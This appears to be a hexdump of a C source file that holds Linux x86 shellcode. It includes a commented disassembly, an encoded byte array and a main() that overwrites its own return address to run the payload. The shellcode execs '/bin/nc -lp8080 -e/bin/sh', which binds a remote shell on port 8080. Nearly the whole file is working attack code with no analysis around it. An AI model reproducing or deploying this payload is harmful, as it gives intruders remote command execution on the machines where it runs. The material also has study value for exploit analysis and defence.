00000000  2f 2a 20 30 38 30 34 38  30 36 30 20 3c 5f 73 74  |/* 08048060 <_st|
00000010  61 72 74 3e 3a 0a 20 38  30 34 38 30 36 30 3a 20  |art>:. 8048060: |
00000020  20 20 20 20 20 20 65 62  20 32 61 20 20 20 20 20  |      eb 2a     |
00000030  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6a 6d  |              jm|
00000040  70 20 20 20 20 38 30 34  38 30 38 63 20 3c 47 6f  |p    804808c <Go|
00000050  74 6f 43 61 6c 6c 3e 0a  20 0a 30 38 30 34 38 30  |toCall>. .080480|
00000060  36 32 20 3c 73 68 65 6c  6c 63 6f 64 65 3e 3a 0a  |62 <shellcode>:.|
00000070  20 38 30 34 38 30 36 32  3a 20 20 20 20 20 20 20  | 8048062:       |
00000080  35 65 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |5e              |
00000090  20 20 20 20 20 20 20 20  70 6f 70 20 20 20 20 25  |        pop    %|
000000a0  65 73 69 0a 20 38 30 34  38 30 36 33 3a 20 20 20  |esi. 8048063:   |
000000b0  20 20 20 20 33 31 20 63  30 20 20 20 20 20 20 20  |    31 c0       |
000000c0  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 20  |            xor |
000000d0  20 20 20 25 65 61 78 2c  25 65 61 78 0a 20 38 30  |   %eax,%eax. 80|
000000e0  34 38 30 36 35 3a 20 20  20 20 20 20 20 38 38 20  |48065:       88 |
000000f0  34 36 20 30 37 20 20 20  20 20 20 20 20 20 20 20  |46 07           |
00000100  20 20 20 20 20 6d 6f 76  20 20 20 20 25 61 6c 2c  |     mov    %al,|
00000110  30 78 37 28 25 65 73 69  29 0a 20 38 30 34 38 30  |0x7(%esi). 80480|
00000120  36 38 3a 20 20 20 20 20  20 20 38 38 20 34 36 20  |68:       88 46 |
00000130  30 66 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0f              |
00000140  20 20 6d 6f 76 20 20 20  20 25 61 6c 2c 30 78 66  |  mov    %al,0xf|
00000150  28 25 65 73 69 29 0a 20  38 30 34 38 30 36 62 3a  |(%esi). 804806b:|
00000160  20 20 20 20 20 20 20 38  38 20 34 36 20 31 39 20  |       88 46 19 |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000180  6f 76 20 20 20 20 25 61  6c 2c 30 78 31 39 28 25  |ov    %al,0x19(%|
00000190  65 73 69 29 0a 20 38 30  34 38 30 36 65 3a 20 20  |esi). 804806e:  |
000001a0  20 20 20 20 20 38 39 20  37 36 20 31 61 20 20 20  |     89 76 1a   |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
000001c0  20 20 20 20 25 65 73 69  2c 30 78 31 61 28 25 65  |    %esi,0x1a(%e|
000001d0  73 69 29 0a 20 38 30 34  38 30 37 31 3a 20 20 20  |si). 8048071:   |
000001e0  20 20 20 20 38 64 20 35  65 20 30 38 20 20 20 20  |    8d 5e 08    |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 6c 65 61 20  |            lea |
00000200  20 20 20 30 78 38 28 25  65 73 69 29 2c 25 65 62  |   0x8(%esi),%eb|
00000210  78 0a 20 38 30 34 38 30  37 34 3a 20 20 20 20 20  |x. 8048074:     |
00000220  20 20 38 39 20 35 65 20  31 65 20 20 20 20 20 20  |  89 5e 1e      |
00000230  20 20 20 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |          mov   |
00000240  20 25 65 62 78 2c 30 78  31 65 28 25 65 73 69 29  | %ebx,0x1e(%esi)|
00000250  0a 20 38 30 34 38 30 37  37 3a 20 20 20 20 20 20  |. 8048077:      |
00000260  20 38 64 20 35 65 20 31  30 20 20 20 20 20 20 20  | 8d 5e 10       |
00000270  20 20 20 20 20 20 20 20  20 6c 65 61 20 20 20 20  |         lea    |
00000280  30 78 31 30 28 25 65 73  69 29 2c 25 65 62 78 0a  |0x10(%esi),%ebx.|
00000290  20 38 30 34 38 30 37 61  3a 20 20 20 20 20 20 20  | 804807a:       |
000002a0  38 39 20 35 65 20 32 32  20 20 20 20 20 20 20 20  |89 5e 22        |
000002b0  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 25  |        mov    %|
000002c0  65 62 78 2c 30 78 32 32  28 25 65 73 69 29 0a 20  |ebx,0x22(%esi). |
000002d0  38 30 34 38 30 37 64 3a  20 20 20 20 20 20 20 38  |804807d:       8|
000002e0  39 20 34 36 20 32 36 20  20 20 20 20 20 20 20 20  |9 46 26         |
000002f0  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 25 65  |       mov    %e|
00000300  61 78 2c 30 78 32 36 28  25 65 73 69 29 0a 20 38  |ax,0x26(%esi). 8|
00000310  30 34 38 30 38 30 3a 20  20 20 20 20 20 20 62 30  |048080:       b0|
00000320  20 30 62 20 20 20 20 20  20 20 20 20 20 20 20 20  | 0b             |
00000330  20 20 20 20 20 20 6d 6f  76 20 20 20 20 24 30 78  |      mov    $0x|
00000340  62 2c 25 61 6c 0a 20 38  30 34 38 30 38 32 3a 20  |b,%al. 8048082: |
00000350  20 20 20 20 20 20 38 39  20 66 33 20 20 20 20 20  |      89 f3     |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000370  76 20 20 20 20 25 65 73  69 2c 25 65 62 78 0a 20  |v    %esi,%ebx. |
00000380  38 30 34 38 30 38 34 3a  20 20 20 20 20 20 20 38  |8048084:       8|
00000390  64 20 34 65 20 31 61 20  20 20 20 20 20 20 20 20  |d 4e 1a         |
000003a0  20 20 20 20 20 20 20 6c  65 61 20 20 20 20 30 78  |       lea    0x|
000003b0  31 61 28 25 65 73 69 29  2c 25 65 63 78 0a 20 38  |1a(%esi),%ecx. 8|
000003c0  30 34 38 30 38 37 3a 20  20 20 20 20 20 20 38 64  |048087:       8d|
000003d0  20 35 36 20 32 36 20 20  20 20 20 20 20 20 20 20  | 56 26          |
000003e0  20 20 20 20 20 20 6c 65  61 20 20 20 20 30 78 32  |      lea    0x2|
000003f0  36 28 25 65 73 69 29 2c  25 65 64 78 0a 20 38 30  |6(%esi),%edx. 80|
00000400  34 38 30 38 61 3a 20 20  20 20 20 20 20 63 64 20  |4808a:       cd |
00000410  38 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |80              |
00000420  20 20 20 20 20 69 6e 74  20 20 20 20 24 30 78 38  |     int    $0x8|
00000430  30 0a 20 0a 30 38 30 34  38 30 38 63 20 3c 47 6f  |0. .0804808c <Go|
00000440  74 6f 43 61 6c 6c 3e 3a  0a 20 38 30 34 38 30 38  |toCall>:. 804808|
00000450  63 3a 20 20 20 20 20 20  20 65 38 20 64 31 20 66  |c:       e8 d1 f|
00000460  66 20 66 66 20 66 66 20  20 20 20 20 20 20 20 20  |f ff ff         |
00000470  20 63 61 6c 6c 20 20 20  38 30 34 38 30 36 32 20  | call   8048062 |
00000480  3c 73 68 65 6c 6c 63 6f  64 65 3e 0a 20 38 30 34  |<shellcode>. 804|
00000490  38 30 39 31 3a 20 20 20  20 20 20 20 32 66 20 20  |8091:       2f  |
000004a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004b0  20 20 20 20 64 61 73 20  20 20 0a 20 38 30 34 38  |    das   . 8048|
000004c0  30 39 32 3a 20 20 20 20  20 20 20 36 32 20 36 39  |092:       62 69|
000004d0  20 36 65 20 20 20 20 20  20 20 20 20 20 20 20 20  | 6e             |
000004e0  20 20 20 62 6f 75 6e 64  20 20 25 65 62 70 2c 30  |   bound  %ebp,0|
000004f0  78 36 65 28 25 65 63 78  29 0a 20 38 30 34 38 30  |x6e(%ecx). 80480|
00000500  39 35 3a 20 20 20 20 20  20 20 32 66 20 20 20 20  |95:       2f    |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000520  20 20 64 61 73 20 20 20  0a 20 38 30 34 38 30 39  |  das   . 804809|
00000530  36 3a 20 20 20 20 20 20  20 36 65 20 20 20 20 20  |6:       6e     |
00000540  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000550  20 6f 75 74 73 62 20 20  25 64 73 3a 28 25 65 73  | outsb  %ds:(%es|
00000560  69 29 2c 28 25 64 78 29  0a 20 38 30 34 38 30 39  |i),(%dx). 804809|
00000570  37 3a 20 20 20 20 20 20  20 36 33 20 32 33 20 20  |7:       63 23  |
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000590  20 61 72 70 6c 20 20 20  25 73 70 2c 28 25 65 62  | arpl   %sp,(%eb|
000005a0  78 29 0a 20 38 30 34 38  30 39 39 3a 20 20 20 20  |x). 8048099:    |
000005b0  20 20 20 32 64 20 36 63  20 37 30 20 33 38 20 33  |   2d 6c 70 38 3|
000005c0  30 20 20 20 20 20 20 20  20 20 20 73 75 62 20 20  |0          sub  |
000005d0  20 20 24 30 78 33 30 33  38 37 30 36 63 2c 25 65  |  $0x3038706c,%e|
000005e0  61 78 0a 20 38 30 34 38  30 39 65 3a 20 20 20 20  |ax. 804809e:    |
000005f0  20 20 20 33 38 20 33 30  20 20 20 20 20 20 20 20  |   38 30        |
00000600  20 20 20 20 20 20 20 20  20 20 20 63 6d 70 20 20  |           cmp  |
00000610  20 20 25 64 68 2c 28 25  65 61 78 29 0a 20 38 30  |  %dh,(%eax). 80|
00000620  34 38 30 61 30 3a 20 20  20 20 20 20 20 32 33 20  |480a0:       23 |
00000630  32 64 20 36 35 20 32 66  20 36 32 20 36 39 20 20  |2d 65 2f 62 69  |
00000640  20 20 20 20 20 61 6e 64  20 20 20 20 30 78 36 39  |     and    0x69|
00000650  36 32 32 66 36 35 2c 25  65 62 70 0a 20 38 30 34  |622f65,%ebp. 804|
00000660  38 30 61 36 3a 20 20 20  20 20 20 20 36 65 20 20  |80a6:       6e  |
00000670  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000680  20 20 20 20 6f 75 74 73  62 20 20 25 64 73 3a 28  |    outsb  %ds:(|
00000690  25 65 73 69 29 2c 28 25  64 78 29 0a 20 38 30 34  |%esi),(%dx). 804|
000006a0  38 30 61 37 3a 20 20 20  20 20 20 20 32 66 20 20  |80a7:       2f  |
000006b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006c0  20 20 20 20 64 61 73 20  20 20 0a 20 38 30 34 38  |    das   . 8048|
000006d0  30 61 38 3a 20 20 20 20  20 20 20 37 33 20 36 38  |0a8:       73 68|
000006e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006f0  20 20 20 6a 61 65 20 20  20 20 38 30 34 38 31 31  |   jae    804811|
00000700  32 20 3c 47 6f 74 6f 43  61 6c 6c 2b 30 78 38 36  |2 <GotoCall+0x86|
00000710  3e 0a 20 38 30 34 38 30  61 61 3a 20 20 20 20 20  |>. 80480aa:     |
00000720  20 20 32 33 20 34 31 20  34 31 20 20 20 20 20 20  |  23 41 41      |
00000730  20 20 20 20 20 20 20 20  20 20 61 6e 64 20 20 20  |          and   |
00000740  20 30 78 34 31 28 25 65  63 78 29 2c 25 65 61 78  | 0x41(%ecx),%eax|
00000750  0a 20 38 30 34 38 30 61  64 3a 20 20 20 20 20 20  |. 80480ad:      |
00000760  20 34 31 20 20 20 20 20  20 20 20 20 20 20 20 20  | 41             |
00000770  20 20 20 20 20 20 20 20  20 69 6e 63 20 20 20 20  |         inc    |
00000780  25 65 63 78 0a 20 38 30  34 38 30 61 65 3a 20 20  |%ecx. 80480ae:  |
00000790  20 20 20 20 20 34 31 20  20 20 20 20 20 20 20 20  |     41         |
000007a0  20 20 20 20 20 20 20 20  20 20 20 20 20 69 6e 63  |             inc|
000007b0  20 20 20 20 25 65 63 78  0a 20 38 30 34 38 30 61  |    %ecx. 80480a|
000007c0  66 3a 20 20 20 20 20 20  20 34 32 20 20 20 20 20  |f:       42     |
000007d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007e0  20 69 6e 63 20 20 20 20  25 65 64 78 0a 20 38 30  | inc    %edx. 80|
000007f0  34 38 30 62 30 3a 20 20  20 20 20 20 20 34 32 20  |480b0:       42 |
00000800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000810  20 20 20 20 20 69 6e 63  20 20 20 20 25 65 64 78  |     inc    %edx|
00000820  0a 20 38 30 34 38 30 62  31 3a 20 20 20 20 20 20  |. 80480b1:      |
00000830  20 34 32 20 20 20 20 20  20 20 20 20 20 20 20 20  | 42             |
00000840  20 20 20 20 20 20 20 20  20 69 6e 63 20 20 20 20  |         inc    |
00000850  25 65 64 78 0a 20 38 30  34 38 30 62 32 3a 20 20  |%edx. 80480b2:  |
00000860  20 20 20 20 20 34 32 20  20 20 20 20 20 20 20 20  |     42         |
00000870  20 20 20 20 20 20 20 20  20 20 20 20 20 69 6e 63  |             inc|
00000880  20 20 20 20 25 65 64 78  0a 20 38 30 34 38 30 62  |    %edx. 80480b|
00000890  33 3a 20 20 20 20 20 20  20 34 33 20 20 20 20 20  |3:       43     |
000008a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008b0  20 69 6e 63 20 20 20 20  25 65 62 78 0a 20 38 30  | inc    %ebx. 80|
000008c0  34 38 30 62 34 3a 20 20  20 20 20 20 20 34 33 20  |480b4:       43 |
000008d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008e0  20 20 20 20 20 69 6e 63  20 20 20 20 25 65 62 78  |     inc    %ebx|
000008f0  0a 20 38 30 34 38 30 62  35 3a 20 20 20 20 20 20  |. 80480b5:      |
00000900  20 34 33 20 20 20 20 20  20 20 20 20 20 20 20 20  | 43             |
00000910  20 20 20 20 20 20 20 20  20 69 6e 63 20 20 20 20  |         inc    |
00000920  25 65 62 78 0a 20 38 30  34 38 30 62 36 3a 20 20  |%ebx. 80480b6:  |
00000930  20 20 20 20 20 34 33 20  20 20 20 20 20 20 20 20  |     43         |
00000940  20 20 20 20 20 20 20 20  20 20 20 20 20 69 6e 63  |             inc|
00000950  20 20 20 20 25 65 62 78  0a 20 38 30 34 38 30 62  |    %ebx. 80480b|
00000960  37 3a 20 20 20 20 20 20  20 34 34 20 20 20 20 20  |7:       44     |
00000970  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000980  20 69 6e 63 20 20 20 20  25 65 73 70 0a 20 38 30  | inc    %esp. 80|
00000990  34 38 30 62 38 3a 20 20  20 20 20 20 20 34 34 20  |480b8:       44 |
000009a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000009b0  20 20 20 20 20 69 6e 63  20 20 20 20 25 65 73 70  |     inc    %esp|
000009c0  0a 20 38 30 34 38 30 62  39 3a 20 20 20 20 20 20  |. 80480b9:      |
000009d0  20 34 34 20 20 20 20 20  20 20 20 20 20 20 20 20  | 44             |
000009e0  20 20 20 20 20 20 20 20  20 69 6e 63 20 20 20 20  |         inc    |
000009f0  25 65 73 70 0a 20 38 30  34 38 30 62 61 3a 20 20  |%esp. 80480ba:  |
00000a00  20 20 20 20 20 34 34 20  20 20 20 20 20 20 20 20  |     44         |
00000a10  20 20 20 20 20 20 20 20  20 20 20 20 20 69 6e 63  |             inc|
00000a20  20 20 20 20 25 65 73 70  0a 2a 2f 0a 20 0a 2f 2f  |    %esp.*/. .//|
00000a30  62 69 6e 2f 6e 63 20 2d  6c 70 38 30 38 30 20 2d  |bin/nc -lp8080 -|
00000a40  65 2f 62 69 6e 2f 73 68  0a 63 68 61 72 20 73 68  |e/bin/sh.char sh|
00000a50  65 6c 6c 63 6f 64 65 5b  5d 20 3d 0a 22 5c 78 65  |ellcode[] =."\xe|
00000a60  62 5c 78 32 61 5c 78 35  65 5c 78 33 31 5c 78 63  |b\x2a\x5e\x31\xc|
00000a70  30 5c 78 38 38 5c 78 34  36 5c 78 30 37 5c 78 38  |0\x88\x46\x07\x8|
00000a80  38 5c 78 34 36 5c 78 30  66 5c 78 38 38 5c 78 34  |8\x46\x0f\x88\x4|
00000a90  36 5c 78 31 39 5c 78 38  39 5c 78 37 36 5c 78 31  |6\x19\x89\x76\x1|
00000aa0  61 5c 78 38 64 5c 78 35  65 5c 78 30 38 5c 78 38  |a\x8d\x5e\x08\x8|
00000ab0  39 5c 78 35 65 22 0a 22  5c 78 31 65 5c 78 38 64  |9\x5e"."\x1e\x8d|
00000ac0  5c 78 35 65 5c 78 31 30  5c 78 38 39 5c 78 35 65  |\x5e\x10\x89\x5e|
00000ad0  5c 78 32 32 5c 78 38 39  5c 78 34 36 5c 78 32 36  |\x22\x89\x46\x26|
00000ae0  5c 78 62 30 5c 78 30 62  5c 78 38 39 5c 78 66 33  |\xb0\x0b\x89\xf3|
00000af0  5c 78 38 64 5c 78 34 65  5c 78 31 61 5c 78 38 64  |\x8d\x4e\x1a\x8d|
00000b00  5c 78 35 36 5c 78 32 36  5c 78 63 64 5c 78 38 30  |\x56\x26\xcd\x80|
00000b10  22 0a 22 5c 78 65 38 5c  78 64 31 5c 78 66 66 5c  |"."\xe8\xd1\xff\|
00000b20  78 66 66 5c 78 66 66 5c  78 32 66 5c 78 36 32 5c  |xff\xff\x2f\x62\|
00000b30  78 36 39 5c 78 36 65 5c  78 32 66 5c 78 36 65 5c  |x69\x6e\x2f\x6e\|
00000b40  78 36 33 5c 78 32 33 5c  78 32 64 5c 78 36 63 5c  |x63\x23\x2d\x6c\|
00000b50  78 37 30 5c 78 33 38 5c  78 33 30 5c 78 33 38 5c  |x70\x38\x30\x38\|
00000b60  78 33 30 5c 78 32 33 5c  78 32 64 22 0a 22 5c 78  |x30\x23\x2d"."\x|
00000b70  36 35 5c 78 32 66 5c 78  36 32 5c 78 36 39 5c 78  |65\x2f\x62\x69\x|
00000b80  36 65 5c 78 32 66 5c 78  37 33 5c 78 36 38 5c 78  |6e\x2f\x73\x68\x|
00000b90  32 33 22 3b 0a 20 0a 69  6e 74 20 6d 61 69 6e 28  |23";. .int main(|
00000ba0  29 0a 7b 0a 20 20 20 20  69 6e 74 20 2a 72 65 74  |).{.    int *ret|
00000bb0  3b 0a 20 20 20 20 72 65  74 20 3d 20 28 69 6e 74  |;.    ret = (int|
00000bc0  20 2a 29 26 72 65 74 20  2b 20 32 3b 0a 20 20 20  | *)&ret + 2;.   |
00000bd0  20 28 2a 72 65 74 29 20  3d 20 28 69 6e 74 29 73  | (*ret) = (int)s|
00000be0  68 65 6c 6c 63 6f 64 65  3b 0a 7d                 |hellcode;.}|
00000beb
